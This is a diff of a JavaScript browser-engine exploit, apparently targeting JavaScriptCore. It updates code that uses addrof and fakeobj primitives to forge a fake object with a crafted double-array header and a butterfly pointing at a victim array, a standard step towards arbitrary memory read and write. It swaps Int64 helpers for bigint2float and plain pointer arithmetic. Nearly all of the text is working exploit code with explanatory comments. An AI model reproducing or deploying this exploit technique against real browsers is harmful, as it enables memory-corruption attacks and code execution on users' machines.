@@ -120,7 +120,7 @@ var print = (msg) => {
     print("[+] victim @"+addrof(victim));
 
     // craft a fake object to modify victim
-    var flags_double_array = new Int64("0x0108200700001000").asJSValue();
+    var flags_double_array = bigint2float(0x0108200700001000);
     var container = {
         header: flags_double_array,
         butterfly: victim
@@ -130,7 +130,7 @@ var print = (msg) => {
     var containerAddr = addrof(container);
     print("[+] container @"+containerAddr);
     // add the offset to let compiler recognize fake structure
-    var hax = fakeobj(Add(containerAddr, 0x10));
+    var hax = fakeobj(containerAddr+0x10);
     // origButterfly is now based on the offset of **victim** 
     // because it becomes the new butterfly pointer
     // and hax[1] === victim.pointer
